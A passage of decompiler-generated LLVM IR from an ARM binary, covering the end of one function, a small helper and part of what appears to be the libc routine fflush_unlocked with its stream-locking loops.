  %v0_16d00 = phi i32 [ %v0_16cf4, %dec_label_pc_16cf4 ], [ %v2_16cd474, %dec_label_pc_16cc8 ], [ %v2_16cd4, %dec_label_pc_16ce0.dec_label_pc_16cd4_crit_edge ]
  %v1_16cf8 = phi i32 [ %v0_16cf4, %dec_label_pc_16cf4 ], [ %v2_16cc8, %dec_label_pc_16cc8 ], [ %v1_16cd8.pre, %dec_label_pc_16ce0.dec_label_pc_16cd4_crit_edge ]
  %v3_16cf8 = icmp uge i32 %v0_16d00, %v1_16cf8
  store i1 %v3_16cf8, i1* %cpsr_c.global-to-local, align 1
  %v9_16cf8 = icmp eq i32 %v0_16d00, %v1_16cf8
  br i1 %v9_16cf8, label %dec_label_pc_16d00, label %dec_label_pc_16cf8.dec_label_pc_16cc8_crit_edge

dec_label_pc_16cf8.dec_label_pc_16cc8_crit_edge:  ; preds = %dec_label_pc_16cf8
  %v0_16cc8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16cc8

dec_label_pc_16d00:                               ; preds = %dec_label_pc_16cf8
  %v2_16d00 = icmp ne i32 %v1_16cf8, 0
  store i1 %v2_16d00, i1* %cpsr_c.global-to-local, align 1
  %v7_16d04 = icmp slt i32 %v1_16cf8, 2
  br i1 %v7_16d04, label %dec_label_pc_16d20, label %dec_label_pc_16d08

dec_label_pc_16d08:                               ; preds = %dec_label_pc_16d00
  %v0_16d08 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16d08, i32* %r0.global-to-local, align 4
  %v0_16d0c = load i32, i32* %r1.global-to-local, align 4
  %v1_16d0c = add i32 %v0_16d0c, 129
  store i32 %v1_16d0c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16d20

dec_label_pc_16d20:                               ; preds = %dec_label_pc_16ca4, %dec_label_pc_16d08, %dec_label_pc_16d00
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_16d24 = load i32, i32* %r5.global-to-local, align 4
  %v2_16d24 = add i32 %v0_16d24, 80
  %v3_16d24 = inttoptr i32 %v2_16d24 to i32*
  %v4_16d24 = load i32, i32* %v3_16d24, align 4
  store i32 %v4_16d24, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_16d2c = inttoptr i32 %v4_16d24 to i32*
  store i32 0, i32* %v2_16d2c, align 4
  br label %dec_label_pc_16d30

dec_label_pc_16d30:                               ; preds = %dec_label_pc_16ba4, %dec_label_pc_16bcc, %dec_label_pc_16d20
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16d34 = load i32, i32* %r5.global-to-local, align 4
  %v2_16d34 = add i32 %v0_16d34, 160
  %v3_16d34 = inttoptr i32 %v2_16d34 to i32*
  %v4_16d34 = load i32, i32* %v3_16d34, align 4
  store i32 %v4_16d34, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16d3c = add i32 %v0_16d34, 12
  %v3_16d3c = inttoptr i32 %v2_16d3c to i32*
  %v4_16d3c = load i32, i32* %v3_16d3c, align 4
  store i32 %v4_16d3c, i32* %r1.global-to-local, align 4
  %v1_16d40 = add i32 %v4_16d34, 4
  %v2_16d40 = inttoptr i32 %v1_16d40 to i32*
  %v3_16d40 = load i32, i32* %v2_16d40, align 4
  store i32 %v3_16d40, i32* %r2.global-to-local, align 4
  %v1_16d44 = inttoptr i32 %v4_16d3c to i32*
  %v2_16d44 = load i32, i32* %v1_16d44, align 4
  %v1_16d48 = add i32 %v3_16d40, -1
  store i32 %v1_16d48, i32* %r2.global-to-local, align 4
  %v1_16d4c = add i32 %v2_16d44, -1
  store i32 %v1_16d4c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16d50 = icmp eq i32 %v1_16d48, 0
  store i32 %v1_16d4c, i32* %v1_16d44, align 4
  %v0_16d58 = load i32, i32* %r2.global-to-local, align 4
  %v1_16d58 = load i32, i32* %r0.global-to-local, align 4
  %v2_16d58 = add i32 %v1_16d58, 4
  %v3_16d58 = inttoptr i32 %v2_16d58 to i32*
  store i32 %v0_16d58, i32* %v3_16d58, align 4
  br i1 %v2_16d50, label %dec_label_pc_16d60, label %dec_label_pc_16dc0

dec_label_pc_16d60:                               ; preds = %dec_label_pc_16d30
  %v0_16d60 = load i32, i32* %r2.global-to-local, align 4
  %v1_16d60 = load i32, i32* %r0.global-to-local, align 4
  %v2_16d60 = add i32 %v1_16d60, 8
  %v3_16d60 = inttoptr i32 %v2_16d60 to i32*
  store i32 %v0_16d60, i32* %v3_16d60, align 4
  %v0_16d64 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16d64, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16d68

dec_label_pc_16d68:                               ; preds = %dec_label_pc_16d98.dec_label_pc_16d68_crit_edge, %dec_label_pc_16d60
  %v0_16d68 = phi i32 [ %v0_16d68.pre, %dec_label_pc_16d98.dec_label_pc_16d68_crit_edge ], [ %v0_16d64, %dec_label_pc_16d60 ]
  %v1_16d68 = inttoptr i32 %v0_16d68 to i32*
  %v2_16d68 = load i32, i32* %v1_16d68, align 4
  store i32 %v2_16d68, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16d68, i32* %r2.global-to-local, align 4
  %v2_16d7462 = load i32, i32* %v1_16d68, align 4
  store i32 %v2_16d7462, i32* %r3.global-to-local, align 4
  %v3_16d7864 = icmp uge i32 %v2_16d7462, %v2_16d68
  store i1 %v3_16d7864, i1* %cpsr_c.global-to-local, align 1
  %v9_16d7870 = icmp eq i32 %v2_16d7462, %v2_16d68
  br i1 %v9_16d7870, label %dec_label_pc_16d80, label %dec_label_pc_16d98

dec_label_pc_16d80:                               ; preds = %dec_label_pc_16d68, %dec_label_pc_16d80.dec_label_pc_16d74_crit_edge
  %v0_16d8071 = phi i32 [ %v1_16d78.pre, %dec_label_pc_16d80.dec_label_pc_16d74_crit_edge ], [ %v2_16d68, %dec_label_pc_16d68 ]
  store i32 %v0_16d8071, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16d90 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16d90, label %dec_label_pc_16d94, label %dec_label_pc_16d80.dec_label_pc_16d74_crit_edge

dec_label_pc_16d80.dec_label_pc_16d74_crit_edge:  ; preds = %dec_label_pc_16d80
  %v0_16d74.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16d78.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16d74 = inttoptr i32 %v0_16d74.pre to i32*
  %v2_16d74 = load i32, i32* %v1_16d74, align 4
  store i32 %v2_16d74, i32* %r3.global-to-local, align 4
  %v3_16d78 = icmp uge i32 %v2_16d74, %v1_16d78.pre
  store i1 %v3_16d78, i1* %cpsr_c.global-to-local, align 1
  %v9_16d78 = icmp eq i32 %v2_16d74, %v1_16d78.pre
  br i1 %v9_16d78, label %dec_label_pc_16d80, label %dec_label_pc_16d98

dec_label_pc_16d94:                               ; preds = %dec_label_pc_16d80
  %v0_16d94 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16d94, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16d98

dec_label_pc_16d98:                               ; preds = %dec_label_pc_16d68, %dec_label_pc_16d80.dec_label_pc_16d74_crit_edge, %dec_label_pc_16d94
  %v0_16da0 = phi i32 [ %v0_16d94, %dec_label_pc_16d94 ], [ %v2_16d7462, %dec_label_pc_16d68 ], [ %v2_16d74, %dec_label_pc_16d80.dec_label_pc_16d74_crit_edge ]
  %v1_16d98 = phi i32 [ %v0_16d94, %dec_label_pc_16d94 ], [ %v2_16d68, %dec_label_pc_16d68 ], [ %v1_16d78.pre, %dec_label_pc_16d80.dec_label_pc_16d74_crit_edge ]
  %v3_16d98 = icmp uge i32 %v0_16da0, %v1_16d98
  store i1 %v3_16d98, i1* %cpsr_c.global-to-local, align 1
  %v9_16d98 = icmp eq i32 %v0_16da0, %v1_16d98
  br i1 %v9_16d98, label %dec_label_pc_16da0, label %dec_label_pc_16d98.dec_label_pc_16d68_crit_edge

dec_label_pc_16d98.dec_label_pc_16d68_crit_edge:  ; preds = %dec_label_pc_16d98
  %v0_16d68.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16d68

dec_label_pc_16da0:                               ; preds = %dec_label_pc_16d98
  %v2_16da0 = icmp ne i32 %v1_16d98, 0
  store i1 %v2_16da0, i1* %cpsr_c.global-to-local, align 1
  %v7_16da4 = icmp slt i32 %v1_16d98, 2
  br i1 %v7_16da4, label %dec_label_pc_16dc0, label %dec_label_pc_16da8

dec_label_pc_16da8:                               ; preds = %dec_label_pc_16da0
  %v0_16da8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16da8, i32* %r0.global-to-local, align 4
  %v0_16dac = load i32, i32* %r1.global-to-local, align 4
  %v1_16dac = add i32 %v0_16dac, 129
  store i32 %v1_16dac, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16dc0

dec_label_pc_16dc0:                               ; preds = %dec_label_pc_16d30, %dec_label_pc_16da8, %dec_label_pc_16da0
  %v2_16dc4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16dc4, i32* %r4.global-to-local, align 4
  %v1_16dc8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16dc8

; uselistorder directives
  uselistorder i32 %v0_16d94, { 1, 0, 2 }
  uselistorder i32 %v1_16d78.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16d68, { 1, 0 }
  uselistorder i32 %v0_16cf4, { 1, 0, 2 }
  uselistorder i32 %v1_16cd8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16cc8, { 1, 0 }
  uselistorder i32 %v0_16c94, { 2, 1, 0 }
  uselistorder i32 %v0_16c38, { 1, 0 }
  uselistorder i32 %v0_16c1c, { 1, 0, 2 }
  uselistorder i32 %v1_16c00.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16bec, { 1, 0 }
  uselistorder i32 %v0_16b90, { 1, 0, 2 }
  uselistorder i32 %v1_16b74.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_16b48, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 6, 5, 7, 8, 9, 11, 10, 12, 14, 13, 15 }
  uselistorder i32* %r6.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 5, 4, 6, 7, 8, 10, 9, 11, 13, 12, 14 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 6, 5, 44, 7, 8, 9, 10, 11, 12, 13, 15, 14, 0, 16, 17, 18, 42, 43, 19, 20, 21, 22, 23, 24, 25, 27, 26, 1, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 2, 40, 41 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 9, 8, 0, 10, 11, 12 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 4, 5, 24, 25, 6, 7, 8, 9, 26, 27, 10, 13, 11, 12, 0, 14, 16, 15, 1, 17, 18, 19, 20, 22, 21, 2, 23 }
  uselistorder i32 8192, { 3, 0, 1, 2 }
  uselistorder i32 47, { 2, 0, 5, 3, 4, 1 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16dc0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16d98, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16d80, { 1, 0 }
  uselistorder label %dec_label_pc_16d30, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16d20, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16cf8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16ce0, { 1, 0 }
  uselistorder label %dec_label_pc_16c94, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_16c5c, { 1, 0 }
  uselistorder label %dec_label_pc_16c30, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_16c20, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16c08, { 1, 0 }
  uselistorder label %dec_label_pc_16ba4, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_16b94, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16b7c, { 1, 0 }
}

define i32 @function_16dd0(i32 %arg1) local_unnamed_addr {
dec_label_pc_16dd0:
  %v0_16dd0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16dd0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_16dd0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16dd0, %bb
  %v10_16de4 = phi i32 [ %arg1, %dec_label_pc_16dd0 ], [ 0, %bb ]
  ret i32 %v10_16de4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_16de8 = load i32, i32* @r5, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* @r6, align 4
  %v4_16df8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 76) to i32*), align 4
  store i32 %v4_16df8, i32* %r3.global-to-local, align 4
  %v4_16dfc = icmp uge i32 %tmp, %v4_16df8
  store i1 %v4_16dfc, i1* %cpsr_c.global-to-local, align 1
  %v10_16dfc = icmp eq i32 %tmp, %v4_16df8
  br i1 %v10_16dfc, label %bb, label %dec_label_pc_16e14

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_16e24

dec_label_pc_16e14:                               ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_16e18 = icmp eq i16* %arg1, null
  br i1 %v3_16e18, label %dec_label_pc_16e24, label %dec_label_pc_17138

dec_label_pc_16e24:                               ; preds = %bb, %dec_label_pc_16e14
  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_16e14 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v4_16e28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 160) to i32*), align 4
  store i32 %v4_16e28, i32* %r5.global-to-local, align 4
  %v0_16e2c = call i32 @__aeabi_read_tp()
  store i32 %v0_16e2c, i32* %r0.global-to-local, align 4
  %v1_16e30 = add i32 %v4_16e28, 8
  %v2_16e30 = inttoptr i32 %v1_16e30 to i32*
  %v3_16e30 = load i32, i32* %v2_16e30, align 4
  store i32 %v3_16e30, i32* %r3.global-to-local, align 4
  %v1_16e34 = add i32 %v0_16e2c, -1168
  store i32 %v1_16e34, i32* %r8.global-to-local, align 4
  %v3_16e38 = icmp uge i32 %v3_16e30, %v1_16e34
  store i1 %v3_16e38, i1* %cpsr_c.global-to-local, align 1
  %v9_16e38 = icmp eq i32 %v3_16e30, %v1_16e34
  br i1 %v9_16e38, label %dec_label_pc_16e80, label %dec_label_pc_16e40

dec_label_pc_16e40:                               ; preds = %dec_label_pc_16e24
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16e28, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_16e4c143 = inttoptr i32 %v4_16e28 to i32*
  %v2_16e4c144 = load i32, i32* %v1_16e4c143, align 4
  store i32 %v2_16e4c144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16e50146 = icmp eq i32 %v2_16e4c144, 0
  br i1 %v9_16e50146, label %dec_label_pc_16e58, label %dec_label_pc_16e70

dec_label_pc_16e58:                               ; preds = %dec_label_pc_16e40, %dec_label_pc_16e58.dec_label_pc_16e4c_crit_edge
  %v0_16e58147 = phi i32 [ %v1_16e50.pre, %dec_label_pc_16e58.dec_label_pc_16e4c_crit_edge ], [ 0, %dec_label_pc_16e40 ]
  store i32 %v0_16e58147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16e68 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16e68, label %dec_label_pc_16e6c, label %dec_label_pc_16e58.dec_label_pc_16e4c_crit_edge

dec_label_pc_16e58.dec_label_pc_16e4c_crit_edge:  ; preds = %dec_label_pc_16e58
  %v0_16e4c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16e50.pre = load i32, i32* @r4, align 4
  %v1_16e4c = inttoptr i32 %v0_16e4c.pre to i32*
  %v2_16e4c = load i32, i32* %v1_16e4c, align 4
  store i32 %v2_16e4c, i32* %r3.global-to-local, align 4
  %v3_16e50 = icmp uge i32 %v2_16e4c, %v1_16e50.pre
  store i1 %v3_16e50, i1* %cpsr_c.global-to-local, align 1
  %v9_16e50 = icmp eq i32 %v2_16e4c, %v1_16e50.pre
  br i1 %v9_16e50, label %dec_label_pc_16e58, label %dec_label_pc_16e70

dec_label_pc_16e6c:                               ; preds = %dec_label_pc_16e58
  %v0_16e6c = load i32, i32* @r4, align 4
  store i32 %v0_16e6c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16e70

dec_label_pc_16e70:                               ; preds = %dec_label_pc_16e40, %dec_label_pc_16e58.dec_label_pc_16e4c_crit_edge, %dec_label_pc_16e6c
  %v0_16e70 = phi i32 [ %v0_16e6c, %dec_label_pc_16e6c ], [ %v2_16e4c144, %dec_label_pc_16e40 ], [ %v2_16e4c, %dec_label_pc_16e58.dec_label_pc_16e4c_crit_edge ]
  %v1_16e70 = phi i32 [ %v0_16e6c, %dec_label_pc_16e6c ], [ 0, %dec_label_pc_16e40 ], [ %v1_16e50.pre, %dec_label_pc_16e58.dec_label_pc_16e4c_crit_edge ]
  %v3_16e70 = icmp uge i32 %v0_16e70, %v1_16e70
  store i1 %v3_16e70, i1* %cpsr_c.global-to-local, align 1
  %v9_16e70 = icmp eq i32 %v0_16e70, %v1_16e70
  br i1 %v9_16e70, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_16e70
  %v1_16e74 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_16e74, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_16e70, %bb65
  %v1_16e78 = xor i1 %v9_16e70, true
  call void @__pseudo_cond_branch(i1 %v1_16e78, i32 ptrtoint (i32* @global_var_14744.525 to i32))
  %v0_16e7c = load i32, i32* %r8.global-to-local, align 4
  %v1_16e7c = load i32, i32* %r5.global-to-local, align 4
  %v2_16e7c = add i32 %v1_16e7c, 8
  %v3_16e7c = inttoptr i32 %v2_16e7c to i32*
  store i32 %v0_16e7c, i32* %v3_16e7c, align 4
  br label %dec_label_pc_16e80

dec_label_pc_16e80:                               ; preds = %dec_label_pc_16e24, %bb66
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16e84 = load i32, i32* @r6, align 4
  %v2_16e84 = add i32 %v0_16e84, 160
  %v3_16e84 = inttoptr i32 %v2_16e84 to i32*
  %v4_16e84 = load i32, i32* %v3_16e84, align 4
  store i32 %v4_16e84, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16e8c = add i32 %v0_16e84, 12
  %v3_16e8c = inttoptr i32 %v2_16e8c to i32*
  %v4_16e8c = load i32, i32* %v3_16e8c, align 4
  store i32 %v4_16e8c, i32* %r2.global-to-local, align 4
  %v1_16e90 = add i32 %v4_16e84, 4
  %v2_16e90 = inttoptr i32 %v1_16e90 to i32*
  %v3_16e90 = load i32, i32* %v2_16e90, align 4
  store i32 %v3_16e90, i32* %r1.global-to-local, align 4
  %v1_16e94 = inttoptr i32 %v4_16e8c to i32*
  %v2_16e94 = load i32, i32* %v1_16e94, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16e98 = icmp eq i32 %v3_16e90, 0
  %v1_16e9c = add i32 %v2_16e94, 1
  store i32 %v1_16e9c, i32* %r3.global-to-local, align 4
  store i32 %v1_16e9c, i32* %v1_16e94, align 4
  br i1 %v2_16e98, label %dec_label_pc_16ea8, label %dec_label_pc_16f08

dec_label_pc_16ea8:                               ; preds = %dec_label_pc_16e80
  %v0_16ea8 = load i32, i32* %r1.global-to-local, align 4
  %v1_16ea8 = load i32, i32* %r0.global-to-local, align 4
  %v2_16ea8 = add i32 %v1_16ea8, 8
  %v3_16ea8 = inttoptr i32 %v2_16ea8 to i32*
  store i32 %v0_16ea8, i32* %v3_16ea8, align 4
  %v0_16eac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16eac, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16eb0

dec_label_pc_16eb0:                               ; preds = %dec_label_pc_16ee0.dec_label_pc_16eb0_crit_edge, %dec_label_pc_16ea8
  %v0_16eb0 = phi i32 [ %v0_16eb0.pre, %dec_label_pc_16ee0.dec_label_pc_16eb0_crit_edge ], [ %v0_16eac, %dec_label_pc_16ea8 ]
  %v1_16eb0 = inttoptr i32 %v0_16eb0 to i32*
  %v2_16eb0 = load i32, i32* %v1_16eb0, align 4
  store i32 %v2_16eb0, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16eb0, i32* %r2.global-to-local, align 4
  %v2_16ebc131 = load i32, i32* %v1_16eb0, align 4
  store i32 %v2_16ebc131, i32* %r3.global-to-local, align 4
  %v3_16ec0133 = icmp uge i32 %v2_16ebc131, %v2_16eb0
  store i1 %v3_16ec0133, i1* %cpsr_c.global-to-local, align 1
  %v9_16ec0139 = icmp eq i32 %v2_16ebc131, %v2_16eb0
  br i1 %v9_16ec0139, label %dec_label_pc_16ec8, label %dec_label_pc_16ee0

dec_label_pc_16ec8:                               ; preds = %dec_label_pc_16eb0, %dec_label_pc_16ec8.dec_label_pc_16ebc_crit_edge
  %v0_16ec8140 = phi i32 [ %v1_16ec0.pre, %dec_label_pc_16ec8.dec_label_pc_16ebc_crit_edge ], [ %v2_16eb0, %dec_label_pc_16eb0 ]
  store i32 %v0_16ec8140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16ed8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16ed8, label %dec_label_pc_16edc, label %dec_label_pc_16ec8.dec_label_pc_16ebc_crit_edge

dec_label_pc_16ec8.dec_label_pc_16ebc_crit_edge:  ; preds = %dec_label_pc_16ec8
  %v0_16ebc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16ec0.pre = load i32, i32* @r4, align 4
  %v1_16ebc = inttoptr i32 %v0_16ebc.pre to i32*
  %v2_16ebc = load i32, i32* %v1_16ebc, align 4
  store i32 %v2_16ebc, i32* %r3.global-to-local, align 4
  %v3_16ec0 = icmp uge i32 %v2_16ebc, %v1_16ec0.pre
  store i1 %v3_16ec0, i1* %cpsr_c.global-to-local, align 1
  %v9_16ec0 = icmp eq i32 %v2_16ebc, %v1_16ec0.pre
  br i1 %v9_16ec0, label %dec_label_pc_16ec8, label %dec_label_pc_16ee0

dec_label_pc_16edc:                               ; preds = %dec_label_pc_16ec8
  %v0_16edc = load i32, i32* @r4, align 4
  store i32 %v0_16edc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16ee0

dec_label_pc_16ee0:                               ; preds = %dec_label_pc_16eb0, %dec_label_pc_16ec8.dec_label_pc_16ebc_crit_edge, %dec_label_pc_16edc
  %v0_16ee8 = phi i32 [ %v0_16edc, %dec_label_pc_16edc ], [ %v2_16ebc131, %dec_label_pc_16eb0 ], [ %v2_16ebc, %dec_label_pc_16ec8.dec_label_pc_16ebc_crit_edge ]
  %v1_16ee0 = phi i32 [ %v0_16edc, %dec_label_pc_16edc ], [ %v2_16eb0, %dec_label_pc_16eb0 ], [ %v1_16ec0.pre, %dec_label_pc_16ec8.dec_label_pc_16ebc_crit_edge ]
  %v3_16ee0 = icmp uge i32 %v0_16ee8, %v1_16ee0
  store i1 %v3_16ee0, i1* %cpsr_c.global-to-local, align 1
  %v9_16ee0 = icmp eq i32 %v0_16ee8, %v1_16ee0
  br i1 %v9_16ee0, label %dec_label_pc_16ee8, label %dec_label_pc_16ee0.dec_label_pc_16eb0_crit_edge

dec_label_pc_16ee0.dec_label_pc_16eb0_crit_edge:  ; preds = %dec_label_pc_16ee0
  %v0_16eb0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16eb0

dec_label_pc_16ee8:                               ; preds = %dec_label_pc_16ee0
  %v2_16ee8 = icmp ne i32 %v1_16ee0, 0
  store i1 %v2_16ee8, i1* %cpsr_c.global-to-local, align 1
  %v7_16eec = icmp slt i32 %v1_16ee0, 2
  br i1 %v7_16eec, label %dec_label_pc_16f08, label %dec_label_pc_16ef0

dec_label_pc_16ef0:                               ; preds = %dec_label_pc_16ee8
  %v0_16ef0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16ef0, i32* %r0.global-to-local, align 4
  %v0_16ef4 = load i32, i32* %r1.global-to-local, align 4
  %v1_16ef4 = add i32 %v0_16ef4, 129
  store i32 %v1_16ef4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16f08

dec_label_pc_16f08:                               ; preds = %dec_label_pc_16e80, %dec_label_pc_16ef0, %dec_label_pc_16ee8
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_16f0c = load i32, i32* @r6, align 4
  %v2_16f0c = add i32 %v0_16f0c, 152
  %v3_16f0c = inttoptr i32 %v2_16f0c to i32*
  %v4_16f0c = load i32, i32* %v3_16f0c, align 4
  store i32 %v4_16f0c, i32* %r5.global-to-local, align 4
  %v1_16f10 = add i32 %v4_16f0c, 8
  %v2_16f10 = inttoptr i32 %v1_16f10 to i32*
  %v3_16f10 = load i32, i32* %v2_16f10, align 4
  store i32 %v3_16f10, i32* %r3.global-to-local, align 4
  %v1_16f14 = load i32, i32* %r8.global-to-local, align 4
  %v3_16f14 = icmp uge i32 %v3_16f10, %v1_16f14
  store i1 %v3_16f14, i1* %cpsr_c.global-to-local, align 1
  %v9_16f14 = icmp eq i32 %v3_16f10, %v1_16f14
  br i1 %v9_16f14, label %dec_label_pc_16f5c, label %dec_label_pc_16f1c

dec_label_pc_16f1c:                               ; preds = %dec_label_pc_16f08
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16f0c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_16f28123 = inttoptr i32 %v4_16f0c to i32*
  %v2_16f28124 = load i32, i32* %v1_16f28123, align 4
  store i32 %v2_16f28124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16f2c126 = icmp eq i32 %v2_16f28124, 0
  br i1 %v9_16f2c126, label %dec_label_pc_16f34, label %dec_label_pc_16f4c

dec_label_pc_16f34:                               ; preds = %dec_label_pc_16f1c, %dec_label_pc_16f34.dec_label_pc_16f28_crit_edge
  %v0_16f34127 = phi i32 [ %v1_16f2c.pre, %dec_label_pc_16f34.dec_label_pc_16f28_crit_edge ], [ 0, %dec_label_pc_16f1c ]
  store i32 %v0_16f34127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16f44 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16f44, label %dec_label_pc_16f48, label %dec_label_pc_16f34.dec_label_pc_16f28_crit_edge

dec_label_pc_16f34.dec_label_pc_16f28_crit_edge:  ; preds = %dec_label_pc_16f34
  %v0_16f28.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16f2c.pre = load i32, i32* @r4, align 4
  %v1_16f28 = inttoptr i32 %v0_16f28.pre to i32*
  %v2_16f28 = load i32, i32* %v1_16f28, align 4
  store i32 %v2_16f28, i32* %r3.global-to-local, align 4
  %v3_16f2c = icmp uge i32 %v2_16f28, %v1_16f2c.pre
  store i1 %v3_16f2c, i1* %cpsr_c.global-to-local, align 1
